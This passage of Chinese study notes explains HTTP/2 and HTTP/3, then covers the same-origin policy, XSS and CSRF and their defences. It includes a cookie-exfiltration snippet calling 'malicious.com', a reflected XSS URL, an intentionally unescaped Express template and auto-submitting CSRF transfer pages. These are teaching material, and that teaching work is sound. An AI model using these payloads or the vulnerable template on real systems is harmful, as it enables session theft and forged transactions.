HTTP/2 还可以直接将数据提前推送到浏览器。，当用户请求一个 HTML 页面之后，服务器知道该 HTML 页面会引用几个重要的 JavaScript 文件和 CSS 文件，那么在接收到 HTML 请求之后，附带将要使用的 CSS 文件和 JavaScript 文件一并发送给浏览器，这样当浏览器解析完 HTML 文件之后，就能直接拿到需要的 CSS 文件和 JavaScript 文件，这对首次打开页面的速度起到了至关重要的作用。

###### 3. 头部压缩

HTTP/2 对请求头和响应头进行了压缩，在浏览器发送请求的时候，基本上都是发送 HTTP 请求头，很少有请求体的发送，通常情况下页面也有 100 个左右的资源，如果将这 100 个请求头的数据压缩为原来的 20%，那么传输效率肯定能得到大幅提升。

**虽然 HTTP/2 解决了 HTTP/1.1 中的队头阻塞问题，但是 HTTP/2 依然是基于 TCP 协议的，而 TCP 协议依然存在数据包级别的队头阻塞问题，那么你觉得 TCP 的队头阻塞是如何影响到 HTTP/2 性能的呢？**

注意：

对头堵塞的分类有：

- HTTP 的对头堵塞

- TCP 的对头堵塞（TCP 协议存在数据包级别的队头阻塞问题）

  > tcp 层对每个数据包都有编号，分为 1，2，3 .... tcp 保证双向稳定可靠的传输，如果 2 包数据丢失，1 号包和 3 号包来了，那么在超时重传时间还没有收到 2 编号数据包，服务端会发送 2 号数据包，客服端收到之后，发出确认，服务端**才会继续发送其他数据**，客服端数据才会呈现给上层应用层，这样 tcp 层的阻塞就发生了。
  >
  > 高速重发控制

HTTP/2 协议规范于 2015 年 5 月正式发布。在 HTTP/2 出现之前，开发者需要采取很多**变通的方式**来解决 HTTP/1 所存在的问题，不过 HTTP/2 在 2018 年就开始得到了大规模的应用，HTTP/1 中存在的一大堆缺陷都得到了解决。

#### HTTP/3

http2 的多路复用：

1. 一个域名下面只建立一个 TCP 持久连接
2. 多个 http 请求都在这一个连接中发送，解决应用层队头阻塞（二进制分帧层）
3. 能充分利用带宽
4. 最大限度规避了 TCP 的慢启动
5. 头部压缩
6. 服务器推送

http2 采用多路复用技术（引入二进制分帧层），可以在一个 TCP 连接中同时发送多个 HTTP 请求。因为每个请求经过二进制分帧层后，每个请求中同一个请求拆分的数据包后会带有一个相同的 id 标识，标识相同，说明那些数据包是属于同一个请求的。数据包到达接收端后，会在接收端通过标识将多个数据包合并为一个请求，从而实现 http 请求的区分。 同时因为一个域名下只有一个 TCP 连接需要建立，所以最大限度的回避了 TCP 的慢启动问题，同时也避免了多条 TCP 连接之间的带宽竞争问题。 同时 http2.0 还支持头部压缩和服务器推送功能。

##### HTTP/2 缺陷

###### TCP 的队头阻塞

HTTP/2 解决了**应用层面**的队头阻塞问题，但 HTTP/2 依然是基于 TCP 协议的，而 TCP 最初就是为了**单连接**而设计的。可以把 TCP 连接看成是两台计算机之间的一个虚拟管道，计算机的一端将要传输的数据按照顺序放入管道，最终数据会以相同的顺序出现在管道的另外一头。

HTTP/1.1 协议栈中 TCP 是如何传输数据的。

正常情况下的 TCP 传输数据过程

![img](https://static001.geekbang.org/resource/image/c2/f0/c231ab4b825df8b6f730f484fce596f0.png)

从一端发送给另外一端的数据会被拆分为一个个有顺序的数据包，这些数据包通过网络传输到了接收端，接收端乱序接收到后再按照顺序将这些数据包组合成原始数据，完成数据传输。

如果在数据包传输的过程中，有一个数据因为网络故障或者其他原因而丢包了，那么整个 TCP 的连接就会处于暂停状态，需要等待丢失的数据包被重新传输过来。可以把 TCP 连接看成是一个按照顺序传输数据的管道，管道中的任意一个数据丢失了，那之后的数据都需要等待该数据的重新传输。

TCP 丢包状态

![img](https://static001.geekbang.org/resource/image/33/96/33d2b4c14a7a2f19ef6677696b67de96.png)

**在 TCP 传输过程中，由于单个数据包的丢失而造成的阻塞称为 TCP 上的队头阻塞。**

那队头阻塞是怎么影响 HTTP/2 传输的呢？首先正常情况下 HTTP/2 是怎么传输多路请求的：

![img](https://static001.geekbang.org/resource/image/48/d1/4837434655a6d87f1bf5e3d899a698d1.png)

在 HTTP/2 中，多个请求是跑在一个 TCP 管道中的，如果其中**任意一路**数据流中出现了丢包的情况，那么就会阻塞该 TCP 连接中的**所有请求**。这不同于 HTTP/1.1，使用 HTTP/1.1 时，浏览器为每个域名开启了 6 个 TCP 连接，如果其中的 1 个 TCP 连接发生了队头阻塞，那么其他的 5 个连接依然可以继续传输数据。

所以随着丢包率的增加，HTTP/2 的传输效率也会越来越差。有测试数据表明，当系统达到了 2% 的丢包率时，HTTP/1.1 的传输效率反而比 HTTP/2 表现得更好。

###### TCP 建立连接的延时

**TCP 的握手过程也是影响传输效率的一个重要因素，即 TCP 协议建立连接需要花费的时间。**

网络延迟又称为 RTT（Round Trip Time）：把从浏览器发送一个数据包到服务器，再从服务器返回数据包到浏览器的整个往返时间称为 RTT。RTT 是反映网络性能的一个重要指标。

![image-20220707203848378](.\typora-user-images\image-20220707203848378.png)

建立 TCP 连接时，需要花费多少个 RTT ？——1.5 个 RTT

HTTP/1 和 HTTP/2 都是使用 TCP 协议来传输，HTTPS 还需要使用 TLS 协议进行安全传输。而使用 TLS 也需要一个握手过程，这样就需要有**两个握手延迟过程**。

1. 建立 TCP 连接的三次握手，也就是说需要在消耗完 1.5 个 RTT 之后才能进行数据传输。
2. 进行 TLS 连接（版本：TLS1.2 和 TLS1.3），每个版本建立连接所花的时间不同，大致是需要 1 ～ 2 个 RTT

传输数据之前，一般需要花掉 3 ～ 4 个 RTT。如果浏览器和服务器的物理距离较近，那么 1 个 RTT 的时间可能在 10 毫秒以内，也就是说总共要消耗掉 30 ～ 40 毫秒。但如果服务器相隔较远，那么 1 个 RTT 就可能需要 100 毫秒以上，这种情况下整个握手过程需要 300 ～ 400 毫秒。

通过改进 TCP 协议来解决 http2 中的问题非常困难。因为：

1. **中间设备的僵化**

   > 互联网是由多个网络互联的网状结构，为了能够保障互联网的正常工作，我们需要在互联网的各处搭建各种设备，这些设备就被称为中间设备，这些设备包括了路由器、防火墙、NAT、交换机等。
   >
   > 它们依赖的软件很少升级，而这些软件使用了大量的 TCP 特性，这些功能被设置之后就很少更新。
   >
   > 所以，如果我们在客户端升级了 TCP 协议，但是当新协议的数据包经过这些中间设备时，它们可能不理解包的内容，于是这些数据就会被丢弃掉。这就是中间设备僵化，它是阻碍 TCP 更新的一大障碍。

2. **操作系统导致 TCP 协议僵化**

   > TCP 协议都是通过操作系统内核来实现的，应用程序只能使用不能修改。
   >
   > 通常操作系统的更新都滞后于软件的更新，因此要想自由地更新内核中的 TCP 协议也是非常困难的。

##### QUIC 协议

HTTP/2 的缺陷和 TCP 协议相关。由于 TCP 协议僵化，几乎不可能通过修改 TCP 协议自身来解决这些问题，那么解决问题的思路是绕过 TCP 协议，发明一个 TCP 和 UDP 之外的新的传输协议。这也面临着和修改 TCP 一样的挑战，因为中间设备的僵化，这些设备只认 TCP 和 UDP，如果采用了新的协议，新协议在这些设备同样不被很好地支持。

HTTP/3 选择了一个折衷的方法——UDP 协议，基于 UDP 实现了类似于 TCP 的多路数据流、传输可靠性等功能，把这套功能称为**QUIC 协议**。

![image-20220707211900016](.\typora-user-images\image-20220707211900016.png)

QUIC 协议集合了以下几点功能：

1. **实现了类似 TCP 的流量控制、传输可靠性的功能**。虽然 UDP 不提供可靠性的传输，但 QUIC 在 UDP 的基础之上增加了一层来保证数据可靠性传输。它提供了数据包重传、拥塞控制以及其他一些 TCP 中存在的特性。
2. **集成了 TLS 加密功能**。目前 QUIC 使用的是 TLS1.3，相较于早期版本 TLS1.3 有更多的优点，其中最重要的一点是减少了握手所花费的 RTT 个数。
3. **实现了 HTTP/2 中的多路复用功能**。和 TCP 不同，QUIC 实现了在同一物理连接上可以有多个独立的逻辑数据流（如下图）。实现了数据流的单独传输，就解决了 TCP 中队头阻塞的问题。

![image-20220707212428314](.\typora-user-images\image-20220707212428314.png)

4. **实现了快速握手功能**。由于 QUIC 是基于 UDP 的，所以 QUIC 可以实现使用 0-RTT 或者 1-RTT 来建立连接，这意味着 QUIC 可以用最快的速度来发送和接收数据，这样可以大大提升首次打开页面的速度。

将 HTTP/3 应用到实际环境中的挑战：

1. 从目前的情况来看，服务器和浏览器端都没有对 HTTP/3 提供比较完整的支持。
2. 部署 HTTP/3 也存在着非常大的问题。因为系统内核对 UDP 的优化远远没有达到 TCP 的优化程度。
3. 中间设备僵化的问题。这些设备对 UDP 的优化程度远远低于 TCP，据统计使用 QUIC 协议时，大约有 3%～ 7% 的丢包率。

HTTP/3 正是基于 QUIC 协议的，你可以把 QUIC 看成是集成了“TCP+HTTP/2 的多路复用 +TLS 等功能”的一套协议。这是集众家所长的一个协议，从协议最底层对 Web 的文件传输做了比较彻底的优化，所以等生态相对成熟时，可以用来打造比现在的 HTTP/2 还更加高效的网络。

虽说这套协议解决了 HTTP/2 中因 TCP 而带来的问题，不过由于是改动了底层协议，所以推广起来还会面临着巨大的挑战。

1. 从标准制定到实践再到协议优化还需要走很长一段路；
2. 因为动了底层协议，所以 HTTP/3 的增长会比较缓慢，这和 HTTP/2 有着本质的区别。

## Web 页面安全

没有安全策略，任何资源都可以接入其中页面，我们的网站可以加载并执行别人网站的脚本文件、图片、音频 / 视频等资源，甚至可以下载其他站点的可执行文件。

比如你打开了一个银行站点，然后又一不小心打开了一个恶意站点，如果没有安全措施，恶意站点就可以做很多事情：

- 修改银行站点的 DOM、CSSOM 等信息；
- 在银行站点内部插入 JavaScript 脚本；
- 劫持用户登录的用户名和密码；
- 读取银行站点的 Cookie、IndexDB 等数据；
- 甚至还可以将这些信息上传至自己的服务器，这样就可以在你不知情的情况下伪造一些转账请求等信息。

页面中最基础、最核心的安全策略：同源策略（Same-origin policy）

### 同源策略

什么是同源？

同源：**URL 的协议、域名和端口都相同** 。

浏览器默认**两个相同的源之间是可以相互访问资源和操作 DOM 的**。两个不同的源之间若想要相互访问资源或者操作 DOM，那么会有一套基础的安全策略的制约，我们把这称为同源策略。

同源策略主要表现在 **DOM、Web 数据和网络**这三个层面。

- DOM 层面。同源策略限制了来自不同源的 JavaScript 脚本对当前 DOM 对象读和写的操作。

  从官网中打开另外一个专栏页面，如下图所示：

  ![img](https://static001.geekbang.org/resource/image/c9/d7/c9294ee10c571c8b7061a5c8f03b6cd7.png)

  第一个页面和第二个页面是同源关系，所以我们可以在第二个页面中操作第一个页面的 DOM，比如将第一个页面全部隐藏掉，代码如下所示：

```js
{
  let pdom = opener.document;
  pdom.body.style.display = 'none';
}
// 对象 opener 就是指向第一个页面的 window 对象，我们可以通过操作 opener 来控制第一个页面中的 DOM。
```

​ 在第二个页面的控制台中执行上面那段代码，就成功地操作了第一个页面中的 DOM，将页面隐藏了，如下图： ​ ![img](https://static001.geekbang.org/resource/image/2a/25/2a988d3d2f82aa4230f2b5025134b125.png)

如果打开的第二个页面和第一个页面不是同源的，那么它们就无法相互操作 DOM。

![img](https://static001.geekbang.org/resource/image/71/b5/711d96a58f670bda0d9b9608165839b5.png)

- 数据层面。同源策略限制了不同源的站点读取当前站点的 Cookie、IndexDB、LocalStorage 等数据。由于同源策略，我们依然无法通过第二个页面的 opener 来访问第一个页面中的 Cookie、IndexDB 或者 LocalStorage 等内容。

- 网络层面。同源策略限制了通过 XMLHttpRequest 等方式将站点的数据发送给不同源的站点。

**浏览器出让了同源策略的哪些安全性**

1. 页面中可以嵌入第三方资源同源策略要让一个页面的所有资源都来自于同一个源，也就是要将该页面的所有 HTML 文件、JavaScript 文件、CSS 文件、图片等资源都部署在同一台服务器上，这带来了诸多限制。比如将不同的资源部署到不同的 CDN 上时，CDN 上的资源就部署在另外一个域名上，因此我们就需要同源策略对页面的引用资源开一个“口子”，让其任意引用外部文件。

   最初的浏览器都是支持外部引用资源文件的，不过这也带来了很多问题。之前在开发浏览器的时候，遇到最多的一个问题是浏览器的首页内容会被一些恶意程序劫持，劫持的途径很多，其中最常见的是恶意程序通过各种途径往 HTML 文件中插入恶意脚本。比如，恶意程序在 HTML 文件内容中插入如下一段 JavaScript 代码： ![img](https://static001.geekbang.org/resource/image/74/de/741dc2c53217aee177d18375a7aa94de.png)

   当这段 HTML 文件的数据被送达浏览器时，浏览器是无法区分被插入的文件是恶意的还是正常的，这样恶意脚本就寄生在页面之中，当页面启动时，它可以修改用户的搜索结果、改变一些内容的连接指向，等等。

   除此之外，它还能将页面的的敏感数据，如 Cookie、IndexDB、LoacalStorage 等数据通过 XSS 的手段发送给服务器。具体来讲就是，当你不小心点击了页面中的一个恶意链接时，恶意 JavaScript 代码可以读取页面数据并将其发送给服务器，如下面这段伪代码：

   ```js
   function onClick() {
     let url = `http://malicious.com?cookie = ${document.cookie}`;
     open(url);
   }
   onClick();
   ```

   在这段代码中，恶意脚本读取 Cookie 数据，并将其作为参数添加至恶意站点尾部，当打开该恶意页面时，恶意服务器就能接收到当前用户的 Cookie 信息。以上就是一个非常**典型的 XSS 攻击**。为了解决 XSS 攻击，浏览器中引入了内容安全策略，称为 CSP。CSP 的核心思想是**让服务器决定浏览器能够加载哪些资源**，让服务器决定浏览器是否能够执行内联 JavaScript 代码。通过这些手段就可以大大减少 XSS 攻击。

### 跨域资源共享和跨文档消息机制

默认情况下，通过 XMLHttpRequest 或者 Fetch 来请求非同源地址中的资源，这时同源策略会阻止其向非同源地址发出请求，这样会大大制约我们的生产力。

为了解决这个问题，引入了跨域资源共享（CORS），使用该机制可以进行跨域访问控制，从而使跨域数据传输得以安全进行。

如果两个页面不是同源的，则无法相互操纵 DOM。不过在实际应用中，经常需要两个不同源的 DOM 之间进行通信，于是浏览器中又引入了跨文档消息机制，可以通过 window.postMessage 的 JavaScript 接口来和不同源的 DOM 进行通信。

### 跨站脚本攻击（XSS）

默认页面中可以引用任意第三方资源，然后又引入 CSP 策略来加以限制；默认 XMLHttpRequest 和 Fetch 不能跨站请求资源，然后又通过 CORS 策略来支持其跨域。

支持页面中的第三方资源引用和 CORS 也带来了很多安全问题，其中最典型的就是 XSS 攻击。

#### XSS 攻击

XSS 全称是 Cross Site Scripting。 “跨站脚本”。XSS 攻击是指黑客往 HTML 文件中或者 DOM 中注入恶意脚本，从而在用户浏览页面时利用注入的恶意脚本对用户实施攻击的一种手段。

当页面被注入了恶意 JavaScript 脚本时，浏览器无法区分这些脚本是被恶意注入的还是正常的页面内容，所以恶意注入 JavaScript 脚本也拥有所有的脚本权限。

**如果页面被注入了恶意 JavaScript 脚本，恶意脚本都能做哪些事情？**

- **可以窃取 Cookie 信息**。恶意 JavaScript 通过“document.cookie”获取 Cookie 信息，然后通过 XMLHttpRequest 或者 Fetch 加上 CORS 功能将数据发送给恶意服务器；恶意服务器拿到用户的 Cookie 信息之后，就可以在其他电脑上模拟用户的登录，然后进行转账等操作。
- 可以**监听用户行为**。恶意 JavaScript 使用“addEventListener”接口来监听键盘事件，比如可以获取用户输入的信用卡等信息，将其发送到恶意服务器。
- 可以通过**修改 DOM**伪造假的登录窗口，用来欺骗用户输入用户名和密码等信息。
- 可以**在页面内生成浮窗广告**，这些广告会严重地影响用户体验。

#### 恶意脚本的注入方式

网站开发者应该尽可能地避免页面中被注入恶意脚本。注入恶意脚本的方式：

1. **存储型 XSS 攻击**

![image-20220709153832807](.\typora-user-images\image-20220709153832807.png)

存储型 XSS 攻击大致需要经过如下步骤：

- 首先黑客利用站点漏洞将一段恶意 JavaScript 代码提交到网站的数据库中；
- 然后用户向网站请求包含了恶意 JavaScript 脚本的页面；
- 当用户浏览该页面的时候，恶意脚本就会将用户的 Cookie 信息等数据上传到服务器。

**例子**

2015 年喜马拉雅就被曝出了存储型 XSS 漏洞。起因是在用户设置专辑名称时，服务器对关键字过滤不严格，比如可以将专辑名称设置为一段 JavaScript，如下图所示：

![image-20220709154020090](.\typora-user-images\image-20220709154020090.png)

当黑客将专辑名称设置为一段 JavaScript 代码并提交时，喜马拉雅的服务器会保存该段 JavaScript 代码到数据库中。然后当用户打开黑客设置的专辑时，这段代码就会在用户的页面里执行（如下图），这样就可以获取用户的 Cookie 等数据信息。

![image-20220709154134713](.\typora-user-images\image-20220709154134713.png)

当用户打开黑客设置的专辑页面时，服务器也会将这段恶意 JavaScript 代码返回给用户，因此这段恶意脚本就在用户的页面中执行了。

恶意脚本可以通过 XMLHttpRequest 或者 Fetch 将用户的 Cookie 数据上传到黑客的服务器，如下图所示：

![image-20220709154239238](.\typora-user-images\image-20220709154239238.png)

黑客拿到了用户 Cookie 信息之后，就可以利用 Cookie 信息在其他机器上登录该用户的账号（如下图），并利用用户账号进行一些恶意操作。

2. **反射型 XSS 攻击**

黑客拿到了用户 Cookie 信息之后，就可以利用 Cookie 信息在其他机器上登录该用户的账号（如下图），并利用用户账号进行一些恶意操作。

实例代码：

```js
var express = require('express');
var router = express.Router();

/* GET home page. */
router.get('/', function (req, res, next) {
  res.render('index', { title: 'Express', xss: req.query.xss });
});

module.exports = router;
```

index.html

```html
<!DOCTYPE html>
<html>
  <head>
    <title><%= title %></title>
    <link rel="stylesheet" href="/stylesheets/style.css" />
  </head>
  <body>
    <h1><%= title %></h1>
    <p>Welcome to <%= title %></p>
    <div><%- xss %></div>
  </body>
</html>
```

服务端的作用是：将 URL 中 xss 参数的内容显示在页面。当打开`http://localhost:3000/?xss=<script>alert('你被xss攻击了')</script>`这段 URL 时，其结果如下图所示：

![image-20220709163203356](.\typora-user-images\image-20220709163203356.png)

用户将一段含有恶意代码的请求提交给 Web 服务器，Web 服务器接收到请求时，又将恶意代码反射给了浏览器端，这就是反射型 XSS 攻击。在现实生活中，恶意链接的原理（所以可以查看连接的格式是否包含脚本）。

**Web 服务器不会存储反射型 XSS 攻击的恶意脚本，这是和存储型 XSS 攻击不同的地方**。

3. **基于 DOM 的 XSS 攻击**

基于 DOM 的 XSS 攻击不涉及 Web 服务器。具体来讲，黑客通过各种手段将恶意脚本注入用户的页面中，比如通过网络劫持在页面传输过程中修改 HTML 页面的内容，这种劫持类型很多，有通过 WiFi 路由器劫持的，有通过本地恶意软件来劫持的，它们的共同点是在 Web 资源传输过程或者在用户使用页面的过程中修改 Web 页面的数据。

#### 组织 XSS 攻击

储型 XSS 攻击和反射型 XSS 攻击都是需要经过 Web 服务器来处理，因此可以认为这两种类型的漏洞是服务端的安全漏洞。而基于 DOM 的 XSS 攻击全部都是在浏览器端完成的，因此基于 DOM 的 XSS 攻击是属于前端的安全漏洞。

但无论是何种类型的 XSS 攻击，它们都有一个共同点，那就是首先往浏览器中注入恶意脚本，然后再通过恶意脚本将用户信息发送至黑客部署的恶意服务器上。

所以要阻止 XSS 攻击，我们可以通过阻止恶意 JavaScript 脚本的注入和恶意消息的发送来实现。

**常用的阻止 XSS 攻击的策略**

1. **服务器对输入脚本进行过滤或转码**

不管是反射型还是存储型 XSS 攻击，

都可以在服务器端将一些关键的字符进行转码，比如最典型的：

```
code:<script>alert('你被 xss 攻击了')</script>
```

这段代码过滤后，只留下了：

```
code:
```

这样，当用户再次请求该页面时，由于`<script>`标签的内容都被过滤了，所以这段脚本在客户端是不可能被执行的。

除了过滤之外，服务器还可以对这些内容进行转码，还是上面那段代码，经过转码之后，效果如下所示：

```
code:&lt;script&gt;alert(&#39; 你被 xss 攻击了 &#39;)&lt;/script&gt;
```

经过转码之后的内容，如`<script>`标签被转换为`<script>`，因此即使这段脚本返回给页面，页面也不会执行这段脚本。

2.  **充分利用 CSP**

实施严格的 CSP 可以有效地防范 XSS 攻击，具体来讲 CSP 有如下几个功能：

- 限制加载其他域下的资源文件，这样即使黑客插入了一个 JavaScript 文件，这个 JavaScript 文件也是无法被加载的；
- 禁止向第三方域提交数据，这样用户数据也不会外泄；
- 禁止执行内联脚本和未授权的脚本；
- 还提供了上报机制，这样可以帮助我们尽快发现有哪些 XSS 攻击，以便尽快修复问题。

3. **使用 HttpOnly 属性**

由于很多 XSS 攻击都是来盗用 Cookie 的，因此还可以通过使用 HttpOnly 属性来保护我们 Cookie 的安全。

通常服务器可以将某些 Cookie 设置为 HttpOnly 标志，HttpOnly 是服务器通过 HTTP 响应头来设置的，下面是打开 Google 时，HTTP 响应头中的一段：

```
set-cookie: NID=189=M8q2FtWbsR8RlcldPVt7qkrqR38LmFY9jUxkKo3-4Bi6Qu_ocNOat7nkYZUTzolHjFnwBw0izgsATSI7TZyiiiaV94qGh-BzEYsNVa7TZmjAYTxYTOM9L_-0CN9ipL6cXi8l6-z41asXtm2uEwcOC5oh9djkffOMhWqQrlnCtOI; expires=Sat, 18-Apr-2020 06:52:22 GMT; path=/; domain=.google.com; HttpOnly
```

顾名思义，使用 HttpOnly 标记的 Cookie 只能使用在 HTTP 请求过程中，所以无法通过 JavaScript (无法通过 document.cookie 是来读取) 来读取这段 Cookie。我们还可以通过 Chrome 开发者工具来查看哪些 Cookie 被标记了 HttpOnly，如下图：

![image-20220709164027335](.\typora-user-images\image-20220709164027335.png)

4. 通过添加验证码防止脚本冒充用户提交危险操作。
5. 对于一些不受信任的输入，还可以限制其输入长度。

### CSRF 攻击

![image-20220709164545996](.\typora-user-images\image-20220709164545996.png)

流程：

- 用户访问某个需要登录的网站，并且网站会返回一些登陆状态信息给浏览器存储下来（Cookie、Session）
- 用户通过在该需要登陆的网站中点击了其他站点的链接并跳转
- 黑客就能获取到用户的登录状态信息，伪造用户的请求到用户登录的那个网站中去进行一些操作

CSRF 英文全称是 Cross-site request forgery，所以又称为“**跨站请求伪造**”，是指黑客 引诱用户打开黑客的网站，在黑客的网站中，利用用户的登录状态发起的**跨站请求**。

通常当用户打开了黑客的页面后，黑客有三种方式去实施 CSRF 攻击。

**例子**

这里假设极客时 间具有转账功能，可以通过 POST 或 Get 来实现转账，转账接口如下所示：

```
# 同时支持 POST 和 Get
# 接口
https://time.geekbang.org/sendcoin
# 参数
## 目标用户
user
## 目标金额
number
```

#### 1. 自动发起 Get 请求

```html
<!DOCTYPE html>
<html>
  <body>
    <h1>黑客的站点：CSRF 攻击演示</h1>
    <img src="https://time.geekbang.org/sendcoin?user=hacker&number=100" />
  </body>
</html>
```

黑客页面的 HTML 代码，在这段代码中，黑客将转账的请求接口隐藏在 img 标签内， 欺骗浏览器这是一张图片资源。当该页面被加载时，浏览器会自动发起 img 的资源请求，如果服务器没有对该请求做判断的话，那么服务器就会认为该请求是一个转账请求，于是用 户账户上的 100 极客币就被转移到黑客的账户上去。

#### 2. 自动发起 POST 请求

有些服务器的接口是使用 POST 方法的，所以黑客还需要在 他的站点上伪造 POST 请求，当用户打开黑客的站点时，是自动提交 POST 请求，具体的 方式你可以参考下面示例代码：

```html
<!DOCTYPE html>
<html>
<body>
<h1> 黑客的站点：CSRF 攻击演示 </h1>
<form id='hacker-form' action="https://time.geekbang.org/sendcoin" method=POS
<input type="hidden" name="user" value="hacker" />
<input type="hidden" name="number" value="100" />
</form>
<script> document.getElementById('hacker-form').submit(); </script>
</body>
</html>
```

黑客在他的页面中构建了一个隐藏的表单，该表单的内容就是 极客时间的转账接口。当用户打开该站点之后，这个表单会被自动执行提交；当表单被提交 之后，服务器就会执行转账操作。因此使用构建自动提交表单这种方式，就可以自动实现跨 站点 POST 数据提交。

#### 3. 引诱用户点击链接

诱惑用户点击黑客站点上的链接，这 种方式通常出现在论坛或者恶意邮件上。黑客会采用很多方式去诱惑用户点击链接，示例代 码如下所示：

```html
<div>
<img width=150 src=http://images.xuejuzi.cn/1612/1_161230185104_1.jpg> </img>
<a href="https://time.geekbang.org/sendcoin?user=hacker&number=100" taget="_blank"
点击下载美女照片
</a>
</div>
```

这段黑客站点代码，页面上放了一张美女图片，下面放了图片下载地址，而这个下载地址实 际上是黑客用来转账的接口，一旦用户点击了这个链接，那么他的极客币就被转到黑客账户。

**和 XSS 不同的是，CSRF 攻击不需要将恶 意代码注入用户的页面，仅仅是利用服务器的漏洞和用户的登录状态来实施攻击。**

#### 防止 CSRF 攻击

CSRF 攻击的一些“特征”，发起 CSRF 攻击的三个必要条件：

1. 目标站点一定要有 CSRF 漏洞；
2. 用户要登录过目标站点，并且在浏览器上保持有该站点的登录状态；
3. 需要用户打开一个第三方站点，可以是黑客的站点，也可以是一些论坛。

黑客是无法通过 CSRF 攻击来获取用户页面数据的；其最关键的一点是要能找到服务器的漏洞，所以说对于 CSRF 攻击主要的防护手段是提升服务器的安全性。

防止 CSRF 攻击的手段：

1. **利用好 Cookie 的 SameSite 属性**

黑客会利用用户的登录状态来发起 CSRF 攻击，而 Cookie 正是浏览器和服务器之间维护登录状态的一个关键数据，因此要阻止 CSRF 攻击， 我们首先就要考虑在 Cookie 上来做文章。

通常 CSRF 攻击都是从第三方站点发起的，要防止 CSRF 攻击，我们最好能实现从第三方 站点发送请求时禁止 Cookie 的发送，因此在浏览器通过不同来源发送 HTTP 请求时，有 如下区别：

- 如果是从第三方站点发起的请求，那么需要浏览器禁止发送某些关键 Cookie 数据到服 务器；
- 如果是同一个站点发起的请求，那么就需要保证 Cookie 数据正常发送。

Cookie 中的 SameSite 属性正是为了解决这个问题的，通过使用 SameSite 可以有效地降低 CSRF 攻击的风险。

SameSite 是怎么防止 CSRF 攻击的呢？

`HTTP`是没有状态的，但为了保存状态，网景公司发明了`cookie`用来记录用户的状态信息。但是存在一个弊端，就是我们网站 A 的`cookie`可以作为第三方网站的`cookie`去使用。这样就造成了`CSRF的漏洞`。`SameSite`就可以限制第三方`cookie`的使用。

在 HTTP 响应头中，通过 set-cookie 字段设置 Cookie 时，可以带上 SameSite 选项，如 下：

```http
Set-Cookie: CookieName=CookieValue; SameSite=strict;
```

SameSite 选项通常有 Strict、Lax 和 None 三个值。

- Strict：完全禁止第三方 Cookie，也就是在跨站时，均不会携带`cookie`,只有当前站点的`url`和访问的站点的`url`一致时，才能携带`cookie`。简言之，如果你从极客时间的页面中访问 InfoQ 的资源，而 InfoQ 的某些 Cookie 设置了 SameSite = Strict 的话，那么这些 Cookie 是不会被发送到 InfoQ 的服 务器上的。只有你从 InfoQ 的站点去请求 InfoQ 的资源时，才会带上这些 Cookie。

  > 作者回复: 我把整个流程写一遍：
  >
  > 首先假设你发出登录 InfoQ 的站点请求，然后在 InfoQ 返回 HTTP 响应头给浏览器，InfoQ 响应头中 的某些 set-cookie 字段如下所示：
  >
  > set-cookie: a_value=avalue_xxx; expires=Thu, 21-Nov-2019 03:53:16 GMT; path=/; domai n=.infoq.com; SameSite=strict
  >
  > set-cookie: b_value=bvalue_xxx; expires=Thu, 21-Nov-2019 03:53:16 GMT; path=/; domai n=.infoq.com; SameSite=lax
  >
  > set-cookie: c_value=cvaule_xxx; expires=Thu, 21-Nov-2019 03:53:16 GMT; path=/; domai n=.infoq.com; SameSite=none
  >
  > set-cookie: d_value=dvaule_xxxx; expires=Thu, 21-Nov-2019 03:53:16 GMT; path=/; dom ain=.infoq.com; 我们可以看出，
  >
  > a_value 的 SameSite 属性设置成了 strict，
  >
  > b_value 的 SameSite 属性设置成了 lax
  >
  > c_value 的 SameSite 属性值设置成了 none
  >
  > d_value 没有设置 SameSite 属性值
  >
  > 好，这些 Cookie 设置好之后，当你再次在 InfoQ 的页面内部请求 InfoQ 的资源时，这些 Cookie 信 息都会被附加到 HTTP 的请求头中，如下所示： cookie: a_value=avalue_xxx;b_value=bvalue_xxx;c_value=cvaule_xxx;d_value=dvaule_xxxx;
  >
  > 但是，假如你从 time.geekbang.org 的页面中，通过 a 标签打开页面，如下所示：`<a href="https://www.infoq.cn/sendcoin?user=hacker&number=100">点我下载</a>(https://www.infoq.cn/sendcoin?user=hacker&number=100)`当用户点击整个链接的时候，因为 InfoQ 中 a_vaule 的 SameSite 的值设置成了 strict，那么 a_vaule 的值将不会被携带到这个请求的 HTTP 头中。
  >
  > 如果 time.geekbang.org 的页面中，有通过 img 来加载的 infoq 的资源代码，如下所示：
  >
  > ` <img src="https://www.infoq.cn/sendcoin?user=hacker&number=100" >`
  >
  > 那么在加载 infoQ 资源的时候，只会携带 c_value,和 d_value 的值。

- Lax：在跨站点的情况下，从第三方站点的链接打开和从第三方站点提交 Get 方式的表单这两种方式都会携带 Cookie。但如果在第三方站点中使用 Post 方法， 或者通过 img、iframe 等标签加载的 URL，这些场景都不会携带 Cookie。

导航到目标网址的 GET 请求，只包括三种情况：链接，预加载请求，GET 表单。详见下表。

| 请求类型  |                 示例                 |    正常情况 | Lax         |
| :-------- | :----------------------------------: | ----------: | :---------- |
| 链接      |         `<a href="..."></a>`         | 发送 Cookie | 发送 Cookie |
| 预加载    | `<link rel="prerender" href="..."/>` | 发送 Cookie | 发送 Cookie |
| GET 表单  |  `<form method="GET" action="...">`  | 发送 Cookie | 发送 Cookie |
| POST 表单 | `<form method="POST" action="...">`  | 发送 Cookie | 不发送      |
| iframe    |    `<iframe src="..."></iframe>`     | 发送 Cookie | 不发送      |
| AJAX      |            `$.get("...")`            | 发送 Cookie | 不发送      |
| Image     |          `<img src="...">`           | 发送 Cookie | 不发送      |

设置了`Strict`或`Lax`以后，基本就杜绝了 CSRF 攻击。当然，前提是用户浏览器支持 SameSite 属性。

- None，在任何情况下都会发送 Cookie 数据

对于防范 CSRF 攻击，可以针对实际情况将一些关键的 Cookie 设置为 Strict 或者 Lax 模式，这样在跨站点请求时，这些关键的 Cookie 就不会被发送到服务器，从而使得黑客的 CSRF 攻击失效。

2. **验证请求的来源站点**

在服务器端验证请求来源的站 点。由于 CSRF 攻击大多来自于第三方站点，因此服务器可以禁止来自第三方站点的请 求。那么该怎么判断请求是否来自第三方站点呢？

通过 HTTP 请求头中的 Referer 和 Origin 属性。

Referer 是 HTTP 请求头中的一个字段，记录了该 HTTP 请求的来源地址。比如我从极客 时间的官网打开了 InfoQ 的站点，那么请求头中的 Referer 值是极客时间的 URL，如下 图：

![image-20220709184203088](.\typora-user-images\image-20220709184203088.png)

